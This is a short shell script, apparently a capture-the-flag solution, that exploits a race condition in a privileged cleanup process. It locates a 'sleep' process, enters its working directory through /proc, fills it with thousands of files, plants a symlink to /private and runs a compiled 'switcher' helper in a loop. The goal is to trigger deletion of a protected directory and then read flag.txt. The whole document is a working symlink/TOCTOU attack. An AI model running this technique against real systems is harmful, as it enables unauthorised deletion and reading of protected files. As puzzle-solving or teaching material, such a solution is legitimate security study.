#!/bin/sh

gcc -O3 switcher.c -o switcher

ORIG=$PWD

while [ -d /private/flags ]; do
    echo "Waiting for candidate..."
    while [ -z "${pid}" ]; do
        sleep 1
        pid=$(pidof sleep)
    done

    echo "Found candidate! Filling with garbage..."
    mkdir -p /proc/$pid/cwd/scratch/evil
    echo target=$pid

    cd /proc/$pid/cwd/scratch/evil
    touch $(seq 1 10240)

    cd ..

    ln -s /private link

    echo "Waiting for collection..."
    i=1
    while true; do
      if ! cat evil/$i; then
        break;
      fi
      for j in $(seq 1 256); do
        $ORIG/switcher
      done
      i=$(($i % 10240 + 1))
    done

    unset pid

    cd $ORIG

    sleep 1

    echo "Is the victim file still around?"
    ls -hal /private
done

echo "We deleted, now just wait for it to reappear..."
while ! [ -d /private/flags ]; do
  sleep 1
done

cat /private/flags/flag.txt
